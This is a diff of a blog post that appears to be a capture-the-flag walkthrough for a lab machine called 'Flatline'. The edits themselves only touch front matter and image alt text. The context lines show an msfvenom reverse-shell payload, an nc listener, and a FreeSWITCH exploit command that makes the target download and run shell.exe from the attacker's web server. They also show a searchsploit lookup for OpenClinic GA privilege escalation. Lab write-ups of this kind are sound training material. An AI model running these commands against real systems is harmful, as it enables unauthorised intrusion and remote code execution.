@@ -1,5 +1,5 @@
 ---
-layout: post
+
 title: Walkthrough - Flatline
 published: true
 ---
@@ -50,13 +50,13 @@ Now we can create a payload for the target system `msfvenom -p windows/shell_rev
 - start simple webserver `python3 -m http.server 80` and start listener `rlwrap nc -nvlp 6666`
 - upload and start shell `python3 freeswitch-exploit.py 10.10.71.193 "powershell.exe Invoke-WebRequest -Uri http://10.2.127.225/shell.exe -OutFile ./shell.exe && .\shell.exe"`
 
-![](/assets/flatline01.png)
+![0xskar](/assets/flatline01.png)
 
 * * * 
 
 ## What is the content of user.txt?
 
-![](/assets/flatline02.png)
+![0xskar](/assets/flatline02.png)
 
 * * * 
 
@@ -82,7 +82,7 @@ We find OpenClinic GA on the system `searchsploit -m windows/local/50448.txt`. T
 
 6. Reverse Shell on attacking machine opens
 
-![](/assets/flatline03.png)
+![0xskar](/assets/flatline03.png)
 
 * * * 
 
